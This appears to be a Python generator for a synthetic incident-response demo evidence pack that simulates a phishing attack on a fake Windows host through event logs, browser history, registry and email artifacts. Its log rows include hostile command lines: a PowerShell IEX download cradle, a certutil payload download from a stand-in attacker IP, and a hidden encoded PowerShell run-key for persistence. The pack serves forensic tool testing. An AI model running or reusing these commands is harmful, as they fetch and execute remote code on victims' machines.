from __future__ import annotations

from datetime import UTC, datetime
import csv
import json
import mailbox
from pathlib import Path
import sqlite3
import tempfile
import zipfile
from email.message import EmailMessage


REPO_ROOT = Path(__file__).resolve().parents[2]
DEFAULT_OUTPUT = REPO_ROOT / "demo" / "evidence" / "acme_incident_001.zip"
DEMO_HOST = "TEST-WIN10-01"
DEMO_USER = "user01"
DEMO_DOMAIN = "example.local"


def _write_csv(path: Path, headers: list[str], rows: list[list[object]]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8", newline="") as handle:
        writer = csv.writer(handle)
        writer.writerow(headers)
        writer.writerows(rows)


def _write_jsonl(path: Path, rows: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as handle:
        for row in rows:
            handle.write(json.dumps(row, ensure_ascii=True) + "\n")


def _create_chromium_history_db(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    connection = sqlite3.connect(path)
    connection.executescript(
        """
        CREATE TABLE urls (
            id INTEGER PRIMARY KEY,
            url TEXT,
            title TEXT,
            visit_count INTEGER,
            typed_count INTEGER,
            last_visit_time INTEGER,
            hidden INTEGER DEFAULT 0
        );
        CREATE TABLE visits (
            id INTEGER PRIMARY KEY,
            url INTEGER,
            visit_time INTEGER,
            from_visit INTEGER,
            transition INTEGER
        );
        CREATE TABLE downloads (
            id INTEGER PRIMARY KEY,
            guid TEXT,
            current_path TEXT,
            target_path TEXT,
            start_time INTEGER,
            end_time INTEGER,
            received_bytes INTEGER,
            total_bytes INTEGER,
            state INTEGER,
            danger_type INTEGER,
            interrupt_reason INTEGER,
            mime_type TEXT,
            tab_url TEXT,
            tab_referrer_url TEXT,
            original_mime_type TEXT,
            opened INTEGER,
            site_url TEXT,
            referrer TEXT,
            by_ext_id TEXT,
            by_ext_name TEXT
        );
        CREATE TABLE downloads_url_chains (
            id INTEGER,
            chain_index INTEGER,
            url TEXT
        );
        CREATE TABLE keyword_search_terms (
            keyword_id INTEGER,
            url_id INTEGER,
            term TEXT
        );
        """
    )
    base = 13300050000000000
    connection.execute(
        "INSERT INTO urls(id, url, title, visit_count, typed_count, last_visit_time) VALUES(1, ?, ?, 2, 1, ?)",
        ("https://phishing.example/invoice", "Invoice portal", base),
    )
    connection.execute(
        "INSERT INTO urls(id, url, title, visit_count, typed_count, last_visit_time) VALUES(2, ?, ?, 1, 1, ?)",
        ("https://duckduckgo.com/?q=invoice+docm+powershell", "Search results", base + 2000),
    )
    connection.execute(
        "INSERT INTO visits(id, url, visit_time, from_visit, transition) VALUES(1, 1, ?, 0, 805306368)",
        (base,),
    )
    connection.execute(
        "INSERT INTO visits(id, url, visit_time, from_visit, transition) VALUES(2, 2, ?, 1, 805306368)",
        (base + 2000,),
    )
    connection.execute(
        """
        INSERT INTO downloads(
            id, guid, current_path, target_path, start_time, end_time, received_bytes, total_bytes, state,
            danger_type, interrupt_reason, mime_type, tab_url, tab_referrer_url, original_mime_type, opened,
            site_url, referrer, by_ext_id, by_ext_name
        ) VALUES(
            1, 'guid-demo-1', ?, ?, ?, ?, 4096, 4096, 1,
            0, 0, 'application/octet-stream', 'https://phishing.example/invoice',
            'https://phishing.example', 'application/octet-stream', 0,
            'http://203.0.113.10/payload.exe', 'https://phishing.example', '', ''
        )
        """,
        (
            rf"C:\Users\{DEMO_USER}\Downloads\payload.exe",
            rf"C:\Users\{DEMO_USER}\Downloads\payload.exe",
            base + 1000,
            base + 1500,
        ),
    )
    connection.execute("INSERT INTO downloads_url_chains(id, chain_index, url) VALUES(1, 0, 'http://203.0.113.10/payload.exe')")
    connection.execute("INSERT INTO keyword_search_terms(keyword_id, url_id, term) VALUES(1, 2, 'invoice docm powershell')")
    connection.commit()
    connection.close()


def _write_demo_eml(path: Path, *, subject: str, attachment_name: str | None, auth_fail: bool, body: str) -> None:
    message = EmailMessage()
    message["From"] = "attacker@phishing.example" if auth_fail else "alerts@acme.example"
    message["To"] = f"{DEMO_USER}@{DEMO_DOMAIN}"
    message["Subject"] = subject
    message["Date"] = "Tue, 19 May 2026 10:15:00 +0000"
    message["Message-ID"] = "<demo-message-1@phishing.example>" if auth_fail else "<demo-benign-1@acme.example>"
    if auth_fail:
        message["Reply-To"] = "billing@download.example"
        message["Authentication-Results"] = "mx.example; spf=fail smtp.mailfrom=phishing.example; dkim=fail header.d=phishing.example; dmarc=fail action=reject"
        message["X-Originating-IP"] = "[203.0.113.10]"
    else:
        message["Authentication-Results"] = "mx.example; spf=pass smtp.mailfrom=acme.example; dkim=pass header.d=acme.example; dmarc=pass action=none"
    message.set_content(body)
    if attachment_name:
        message.add_attachment(b"demo-payload", maintype="application", subtype="octet-stream", filename=attachment_name)
    path.write_bytes(message.as_bytes())


def _write_demo_mbox(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    mbox = mailbox.mbox(str(path), create=True)
    try:
        for idx, subject in enumerate(["Benign update", "Quarterly review"], start=1):
            message = EmailMessage()
            message["From"] = f"team{idx}@acme.example"
            message["To"] = f"{DEMO_USER}@{DEMO_DOMAIN}"
            message["Subject"] = subject
            message["Date"] = f"Tue, 19 May 2026 1{idx}:00:00 +0000"
            message["Message-ID"] = f"<demo-mbox-{idx}@acme.example>"
            message.set_content(f"Body {idx}")
            mbox.add(message)
        mbox.flush()
    finally:
        mbox.close()


def _zip_directory(source_dir: Path, output_zip: Path) -> Path:
    output_zip.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(output_zip, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                archive.write(path, arcname=path.relative_to(source_dir).as_posix())
    return output_zip


def build_demo_evidence_tree(root: Path) -> None:
    root.mkdir(parents=True, exist_ok=True)
    (root / "README.txt").write_text(
        "Synthetic DFIR APP MVP demo evidence pack for ACME Incident 001.\n"
        "All hosts, users, domains, URLs and indicators are synthetic.\n",
        encoding="utf-8",
    )
    (root / "generic_unrelated.csv").write_text("Name,Value\nfoo,bar\n", encoding="utf-8")
    (root / "malicious_marker.txt").write_text("malicious_test_marker\n", encoding="utf-8")

    _write_csv(
        root / "Security-EvtxECmd.csv",
        [
            "EventID",
            "Channel",
            "Provider",
            "NewProcessName",
            "ProcessCommandLine",
            "ParentProcessName",
            "NewProcessId",
            "CreatorProcessId",
            "SubjectUserName",
            "SubjectDomainName",
            "TimeCreated",
            "Computer",
        ],
        [
            [
                "4688",
                "Security",
                "Microsoft-Windows-Security-Auditing",
                r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" C:\Users\user01\Downloads\invoice.docm',
                r"C:\Windows\explorer.exe",
                "0x300",
                "0x200",
                DEMO_USER,
                "EXAMPLE",
                "2026-05-19T10:16:00Z",
                DEMO_HOST,
            ],
            [
                "4688",
                "Security",
                "Microsoft-Windows-Security-Auditing",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                r"powershell.exe -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand AAAA",
                r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                "0x301",
                "0x300",
                DEMO_USER,
                "EXAMPLE",
                "2026-05-19T10:17:00Z",
                DEMO_HOST,
            ],
            [
                "4688",
                "Security",
                "Microsoft-Windows-Security-Auditing",
                r"C:\Windows\System32\certutil.exe",
                r"certutil.exe -urlcache -split -f http://203.0.113.10/payload.exe C:\Users\user01\Downloads\payload.exe",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "0x302",
                "0x301",
                DEMO_USER,
                "EXAMPLE",
                "2026-05-19T10:18:00Z",
                DEMO_HOST,
            ],
            [
                "4688",
                "Security",
                "Microsoft-Windows-Security-Auditing",
                rf"C:\Users\{DEMO_USER}\Downloads\payload.exe",
                rf"C:\Users\{DEMO_USER}\Downloads\payload.exe",
                r"C:\Windows\explorer.exe",
                "0x303",
                "0x200",
                DEMO_USER,
                "EXAMPLE",
                "2026-05-19T10:21:00Z",
                DEMO_HOST,
            ],
        ],
    )
    _write_csv(
        root / "PowerShell-EvtxECmd.csv",
        ["EventID", "Channel", "Provider", "ScriptBlockText", "RenderedMessage", "UserId", "Computer", "TimeCreated"],
        [[
            "4104",
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell",
            "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/payload.exe')",
            "Script block logged",
            "S-1-5-21-111-222-333-1001",
            DEMO_HOST,
            "2026-05-19T10:17:30Z",
        ]],
    )
    _write_csv(
        root / "Defender.csv",
        ["Timestamp", "ThreatName", "Severity", "Action", "Status", "Path", "User"],
        [[
            "2026-05-19T10:22:00Z",
            "Trojan:Win32/DemoPayload",
            "High",
            "Detected",
            "Active",
            rf"C:\Users\{DEMO_USER}\Downloads\payload.exe",
            DEMO_USER,
        ]],
    )
    _write_jsonl(
        root / "dns_events.jsonl",
        [
            {
                "ArtifactType": "dns_cache",
                "Name": "suspicious.example",
                "RecordType": "A",
                "Data": "203.0.113.10",
                "TimeCreated": "2026-05-19T10:14:00Z",
                "Computer": DEMO_HOST,
            },
            {
                "ArtifactType": "dns_cache",
                "Name": "demo-update.duckdns.org",
                "RecordType": "A",
                "Data": "198.51.100.25",
                "TimeCreated": "2026-05-19T10:19:00Z",
                "Computer": DEMO_HOST,
            },
        ],
    )

    chrome_history = root / "Chrome" / "User Data" / "Default" / "History"
    _create_chromium_history_db(chrome_history)

    _write_csv(
        root / "OneDrive_Audit.csv",
        ["Provider", "AccountEmail", "SyncRoot", "LocalPath", "RemotePath", "CloudPath", "Shared", "Status", "LastUpload", "User", "Computer"],
        [[
            "OneDrive",
            f"{DEMO_USER}@{DEMO_DOMAIN}",
            rf"C:\Users\{DEMO_USER}\OneDrive",
            rf"C:\Users\{DEMO_USER}\OneDrive\passwords.xlsx",
            "/Shared/passwords.xlsx",
            "/Shared/passwords.xlsx",
            "true",
            "synced",
            "2026-05-19T10:26:00Z",
            DEMO_USER,
            DEMO_HOST,
        ]],
    )

    _write_csv(
        root / "Autoruns.csv",
        ["ArtifactType", "Hive", "KeyPath", "ValueName", "ValueData", "User", "SID", "LastWriteTime"],
        [[
            "registry_run_key",
            "NTUSER",
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            "Updater",
            r"powershell.exe -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand AAAA",
            DEMO_USER,
            "S-1-5-21-111-222-333-1001",
            "2026-05-19T10:25:00Z",
        ]],
    )

    _write_demo_eml(
        root / "phishing.eml",
        subject="Invoice",
        attachment_name="invoice.docm",
        auth_fail=True,
        body="Please review http://203.0.113.10/payload.exe access_token=demosecret",
    )
    _write_demo_eml(
        root / "benign.eml",
        subject="Welcome",
        attachment_name=None,
        auth_fail=False,
        body="Welcome to ACME.",
    )
    _write_demo_mbox(root / "Thunderbird" / "Profiles" / "abc.default-release" / "Inbox")

    _write_csv(
        root / "RECmd_UserActivity_HighSignal.csv",
        ["SourceFile", "Hive", "KeyPath", "ValueName", "ValueData", "LastWriteTime", "UserName", "SID", "RunCount"],
        [
            [
                rf"C:\Users\{DEMO_USER}\NTUSER.DAT",
                "NTUSER.DAT",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                "a",
                "powershell.exe -NoP -W Hidden -EncodedCommand AAAA",
                "2026-05-19T10:15:30Z",
                DEMO_USER,
                "S-1-5-21-111-222-333-1001",
                "",
            ],
            [
                rf"C:\Users\{DEMO_USER}\NTUSER.DAT",
                "NTUSER.DAT",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count",
                r"P:\Hfref\hfre01\Qbjaybnqf\cnlybnq.rkr",
                "",
                "2026-05-19T10:20:00Z",
                DEMO_USER,
                "S-1-5-21-111-222-333-1001",
                "5",
            ],
            [
                r"C:\Windows\System32\config\SYSTEM",
                "SYSTEM",
                r"HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-111-222-333-1001",
                rf"C:\Users\{DEMO_USER}\AppData\Local\Temp\payload.exe",
                rf"C:\Users\{DEMO_USER}\AppData\Local\Temp\payload.exe",
                "2026-05-19T10:21:00Z",
                "",
                "S-1-5-21-111-222-333-1001",
                "",
            ],
            [
                rf"C:\Users\{DEMO_USER}\NTUSER.DAT",
                "NTUSER.DAT",
                r"HKCU\Software\Microsoft\Office\16.0\Word\Security\Trusted Documents\TrustRecords",
                rf"C:\Users\{DEMO_USER}\Downloads\invoice.docm",
                "01020304",
                "2026-05-19T10:16:30Z",
                DEMO_USER,
                "S-1-5-21-111-222-333-1001",
                "",
            ],
            [
                rf"C:\Users\{DEMO_USER}\NTUSER.DAT",
                "NTUSER.DAT",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
                "url1",
                r"\\server\share\staging",
                "2026-05-19T10:14:30Z",
                DEMO_USER,
                "S-1-5-21-111-222-333-1001",
                "",
            ],
            [
                rf"C:\Users\{DEMO_USER}\NTUSER.DAT",
                "NTUSER.DAT",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellBags",
                "NodeSlot",
                r"E:\Sensitive",
                "2026-05-19T10:27:00Z",
                DEMO_USER,
                "S-1-5-21-111-222-333-1001",
                "",
            ],
        ],
    )
    raw_hives_dir = root / "raw_hives"
    raw_hives_dir.mkdir(parents=True, exist_ok=True)
    (raw_hives_dir / "NTUSER.DAT").write_text("placeholder", encoding="utf-8")
    (raw_hives_dir / "USRCLASS.DAT").write_text("placeholder", encoding="utf-8")

    _write_csv(
        root / "zone_identifier.csv",
        ["FilePath", "ZoneId", "HostUrl", "ReferrerUrl", "SourceFile"],
        [
            [rf"C:\Users\{DEMO_USER}\Downloads\payload.exe", "3", "http://203.0.113.10/payload.exe", "http://phishing.example/", "zone_identifier.csv"],
            [rf"C:\Users\{DEMO_USER}\Downloads\invoice.pdf.exe", "4", "http://download.example/invoice.pdf.exe", "", "zone_identifier.csv"],
        ],
    )
    _write_csv(
        root / "usnjrnl.csv",
        ["FilePath", "Reason", "USN", "TimeStamp", "SourceFile"],
        [
            [rf"C:\Users\{DEMO_USER}\AppData\Local\Temp\stage.zip", "FILE_CREATE", "100", "2026-05-19T10:18:30Z", "usnjrnl.csv"],
            [rf"C:\Users\{DEMO_USER}\Downloads\payload.exe", "RENAME_NEW_NAME", "101", "2026-05-19T10:20:30Z", "usnjrnl.csv"],
            [rf"C:\Users\{DEMO_USER}\Downloads\payload.exe", "FILE_DELETE", "102", "2026-05-19T10:24:00Z", "usnjrnl.csv"],
        ],
    )
    _write_csv(
        root / "i30.csv",
        ["ParentPath", "FileName", "IsDeleted", "InUse", "EntryNumber", "SequenceNumber", "SourceFile"],
        [[rf"C:\Users\{DEMO_USER}\Downloads", "invoice.pdf.exe", "True", "False", "42", "7", "i30.csv"]],
    )
    _write_csv(
        root / "shadowcopy.csv",
        ["ShadowId", "SnapshotTime", "Volume", "Path", "SourceFile"],
        [["{11111111-1111-1111-1111-111111111111}", "2026-05-19T10:30:00Z", "C:", r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1", "shadowcopy.csv"]],
    )
    (root / "$UsnJrnl").write_text("placeholder", encoding="utf-8")
    (root / "$LogFile").write_text("placeholder", encoding="utf-8")
    (root / "$I30").write_text("placeholder", encoding="utf-8")

    _write_csv(
        root / "thumbcache.csv",
        ["ThumbnailPath", "Width", "Height", "CacheEntryHash", "SourceFile"],
        [
            [rf"C:\Users\{DEMO_USER}\Pictures\vacation.jpg", "320", "240", "abc", "thumbcache.csv"],
            [rf"C:\Users\{DEMO_USER}\Downloads\invoice.pdf.exe", "320", "240", "def", "thumbcache.csv"],
            [r"E:\Sensitive\secret_project.png", "320", "240", "ghi", "thumbcache.csv"],
        ],
    )
    _write_csv(
        root / "notifications.csv",
        ["AppName", "Title", "BodyPreview", "CreatedTime", "SourceFile"],
        [
            ["Microsoft Defender", "Threat quarantined: Trojan:Win32/Test", "Malware was blocked", "2026-05-19T10:22:10Z", "notifications.csv"],
            ["OneDrive", "Sync complete", "All files up to date", "2026-05-19T10:26:30Z", "notifications.csv"],
            ["Browser", "Download complete: payload.exe", "Saved to Downloads", "2026-05-19T10:19:10Z", "notifications.csv"],
        ],
    )
    _write_csv(
        root / "activitiescache.csv",
        ["DisplayText", "ActivationUri", "FilePath", "AppName", "StartTime", "SourceFile"],
        [
            ["invoice.docm", "file:///C:/Users/user01/Downloads/invoice.docm", rf"C:\Users\{DEMO_USER}\Downloads\invoice.docm", "WINWORD.EXE", "2026-05-19T10:16:00Z", "activitiescache.csv"],
            ["payload.exe", "file:///C:/Users/user01/Downloads/payload.exe", rf"C:\Users\{DEMO_USER}\Downloads\payload.exe", "explorer.exe", "2026-05-19T10:21:00Z", "activitiescache.csv"],
        ],
    )
    _write_csv(
        root / "windows_edb.csv",
        ["IndexedPath", "ContentType", "LastModified", "Author", "Title", "SourceFile"],
        [
            [rf"C:\Users\{DEMO_USER}\Downloads\payload.exe", "application/octet-stream", "2026-05-19T10:19:00Z", "", "", "windows_edb.csv"],
            [rf"C:\Users\{DEMO_USER}\Desktop\passwords.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "2026-05-19T10:25:30Z", DEMO_USER, "passwords", "windows_edb.csv"],
        ],
    )
    _write_csv(
        root / "eventtranscript.csv",
        ["Provider", "EventText", "CreatedTime", "AppName", "SourceFile"],
        [
            ["Browser", "Suspicious download observed for payload.exe", "2026-05-19T10:19:05Z", "msedge.exe", "eventtranscript.csv"],
            ["Shell", "User opened Downloads folder", "2026-05-19T10:18:00Z", "explorer.exe", "eventtranscript.csv"],
        ],
    )
    _write_csv(
        root / "oalerts.csv",
        ["OfficeApp", "AlertText", "DocumentPath", "TimeCreated", "SourceFile"],
        [[
            "Word",
            "Protected View and Enable Content warning for invoice.docm",
            rf"C:\Users\{DEMO_USER}\Downloads\invoice.docm",
            "2026-05-19T10:16:15Z",
            "oalerts.csv",
        ]],
    )
    _write_csv(
        root / "office_filecache.csv",
        ["DocumentUrl", "DocumentPath", "CacheId", "OfficeApp", "ModifiedTime", "SourceFile"],
        [[
            "https://example.sharepoint.com/sites/demo/invoice.docm",
            rf"C:\Users\{DEMO_USER}\Downloads\invoice.docm",
            "cache-1",
            "Word",
            "2026-05-19T10:16:20Z",
            "office_filecache.csv",
        ]],
    )
    (root / "ActivitiesCache.db").write_text("placeholder", encoding="utf-8")
    (root / "Windows.edb").write_text("placeholder", encoding="utf-8")
    (root / "EventTranscript.db").write_text("placeholder", encoding="utf-8")
    (root / "thumbcache_256.db").write_text("placeholder", encoding="utf-8")
    (root / "wpndatabase.db").write_text("placeholder", encoding="utf-8")

    _write_csv(
        root / "usb_registry_sample.csv",
        [
            "ArtifactType",
            "DeviceInstanceId",
            "Vendor",
            "Product",
            "Serial",
            "FriendlyName",
            "DriveLetter",
            "VolumeSerial",
            "FirstInstallTime",
            "LastArrivalTime",
            "SourceFile",
        ],
        [[
            "usb_registry",
            r"USBSTOR\Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00\1234567890ABCDEF&0",
            "SanDisk",
            "Ultra",
            "1234567890ABCDEF",
            "SanDisk Ultra USB Device",
            "E:",
            "ABCD1234",
            "2026-05-19T10:27:30Z",
            "2026-05-19T10:28:00Z",
            r"C:\Windows\System32\config\SYSTEM",
        ]],
    )
    _write_csv(
        root / "recycle_bin.csv",
        ["OriginalPath", "DeletedTime", "UserSid", "SourceFile"],
        [
            [rf"C:\Users\{DEMO_USER}\Downloads\payload.exe", "2026-05-19T10:24:30Z", "S-1-5-21-111-222-333-1001", "recycle_bin.csv"],
            [rf"C:\Users\{DEMO_USER}\Downloads\invoice.pdf.exe", "2026-05-19T10:25:30Z", "S-1-5-21-111-222-333-1001", "recycle_bin.csv"],
        ],
    )


def generate_demo_evidence(output_zip: Path = DEFAULT_OUTPUT, *, keep_source_dir: bool = False) -> Path:
    with tempfile.TemporaryDirectory(prefix="dfir_demo_acme_") as tmp_dir:
        source_root = Path(tmp_dir) / "acme_incident_001"
        build_demo_evidence_tree(source_root)
        generated = _zip_directory(source_root, output_zip)
        if keep_source_dir:
            extracted_copy = output_zip.with_suffix("")
            if extracted_copy.exists():
                for existing in extracted_copy.rglob("*"):
                    if existing.is_file():
                        existing.unlink()
                for directory in sorted((item for item in extracted_copy.rglob("*") if item.is_dir()), reverse=True):
                    directory.rmdir()
            extracted_copy.mkdir(parents=True, exist_ok=True)
            for path in source_root.rglob("*"):
                target = extracted_copy / path.relative_to(source_root)
                if path.is_dir():
                    target.mkdir(parents=True, exist_ok=True)
                else:
                    target.parent.mkdir(parents=True, exist_ok=True)
                    target.write_bytes(path.read_bytes())
        return generated


def main() -> None:
    output = generate_demo_evidence()
    print(output)


if __name__ == "__main__":
    main()
